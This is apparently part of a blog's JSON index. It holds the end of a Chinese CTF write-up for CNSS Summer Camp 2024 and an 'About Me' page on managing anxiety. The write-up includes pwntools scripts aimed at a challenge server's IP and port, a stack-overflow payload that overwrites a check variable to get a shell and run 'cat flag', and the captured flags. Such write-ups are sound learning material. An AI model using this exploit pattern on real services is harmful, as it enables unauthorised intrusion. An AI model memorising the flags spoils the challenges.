re.search(r'\\[SYSTEM\\]\\[(.*?)\\]\\((\\d+)pt\\)--\\[(.*?)\\]\\((\\d+)pt\\)', data) if match: player_id = match.group(1) player_score = int(match.group(2)) item_name = match.group(3) item_score = int(match.group(4)) expected_response = f&quot;Congratulations to {player_id} for passing [{item_name}], current score is {player_score + item_score} points!&quot; p.sendline(expected_response.encode()) elif '[USER]' in data: if '#ping' in data: p.sendline('pong!'.encode()) elif 'Too Slow' in data: print(&quot;Timeout or unexpected issue occurred.&quot;) break else: print(f&quot;Unhandled data: {data}&quot;)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{GnAlPu8Q-KL65ZOTK-hahahaha-U9BvTeeI}&quot;&quot;&quot; 💓Overflow Me小数组要被塞满了！ nc 152.136.11.155 10022 123456789101112131415161718int __fastcall main(int argc, const char **argv, const char **envp){ _BYTE buf[16]; // [rsp+0h] [rbp-20h] BYREF __int64 v5; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); my_init(argc, argv, envp); puts(&quot;Over flow me pls:&quot;); read(0, buf, 0x20uLL); if ( v5 != 114514 ) { puts(&quot;wrong,try again&quot;); exit(0); } system(&quot;/bin/sh&quot;); return 0;} 最基础的栈溢出。 123456789101112131415from pwn import *host = '152.136.11.155'port = 10022p = remote(host, port)padding = 16payload = b'p' * padding + p64(114514)p.sendlineafter('Over flow me pls:', payload)p.sendline(b'cat flag')p.interactive()&quot;&quot;&quot;cnss{Kz20UZyn-TNTfrc4Z-jiejiejie-sDwO2bC0}&quot;&quot;&quot; 🧩Misc没怎么做，也做不出来，笑死。做出一道音频隐写还有一道Word文档查时间的题。 很有趣的一次经历，记录一下，嘻嘻&gt;.&lt;","link":"/2024/08/07/CNSS-Summer-Camp-2024%20wp/"}],"tags":[{"name":"Crypto","slug":"Crypto","link":"/tags/Crypto/"},{"name":"Network","slug":"Network","link":"/tags/Network/"},{"name":"Math","slug":"Math","link":"/tags/Math/"},{"name":"Abstract Algebra","slug":"Abstract-Algebra","link":"/tags/Abstract-Algebra/"},{"name":"Group Theory","slug":"Group-Theory","link":"/tags/Group-Theory/"},{"name":"DevOps","slug":"DevOps","link":"/tags/DevOps/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"Dev","slug":"Dev","link":"/tags/Dev/"},{"name":"CNSS","slug":"CNSS","link":"/tags/CNSS/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"}],"categories":[{"name":"Crypto","slug":"Crypto","link":"/categories/Crypto/"},{"name":"DevOps","slug":"DevOps","link":"/categories/DevOps/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"}],"pages":[{"title":"About Me","text":"一名普普通通热爱生活的计算机本科生。 情绪、感觉、想法就像天气，那我们就是天空。天气一直在变化，天空只是在那里，负责为天气提供空间。 《当下的力量》这本书里说过，观察者视角看待情绪，不做评价。就单纯地观察这是什么情绪。 神经可塑性：当我们持续重复一种反应模式，就会强化一条特定的神经通路。改变大脑相关区域的结构和功能。重复越多，神经通路就更加牢固。 训练自己用新模式应对情绪。 焦虑的消退不是线性的，而是大脑不断重新评估安全与危险的过程。 灾难化思维 第一，严重高估坏的结果发生的概率 第二，总是会想象坏结果的画面，在脑海中营造各种失败和灾难的场景，深陷其中无法自拔 第三，它会让我们时时刻刻的保持警惕，会很敏感多疑，时刻关注着一些微小的变化和征兆 当想象中的灾难或许真的发生时，低估了自己应对的能力。 灾难化思维会让我们用回避的方式解决问题，结果就是生活中的阻碍越来越多。 坏结果不是你想来想来就能来 最坏的结果可能发生，最好的结果同样可能发生 别让情绪影响了我们的认知，我们的大脑没有那么值得信赖。 思维会无意识地喜欢上问题，因为它们给你某种身份的认同。这是正常的，同时也是病态的。“问题”的意思是，你在心理上不断地琢磨某种情况，而没有真正地在当下采取行动，并且你还无意识地将它变成你的自我感的一部分。你被你的生活情境所累，以至于丧失了对生命的感觉、存在的感觉。或者，你大脑中背负着100件你在未来将会或必须做的事情的重担，却没有将注意力集中在一件你现在就能做的事情上。 如果没有焦虑，人和人之间不会产生连接，早就被那些动物野兽所吞并了。如果没有疼痛，人类的医学就不可能发展到这么好，人的寿命就不可能这么长。如果没有悲伤，那么喜悦又从何而来。 不要美化疾病和痛苦，要学会勇敢 雕塑家说他们只是把石头里的生命解放出来了。 大脑可塑性原理 不要对抗旧路径，而是专注于建立新路径 你的行为决定身份，而非身份决定行为。 生老病死，有谁因为怕就躲过去了？ 想法只是想法，只是因为我们的大脑太疲劳了。","link":"/about/index.html"}]}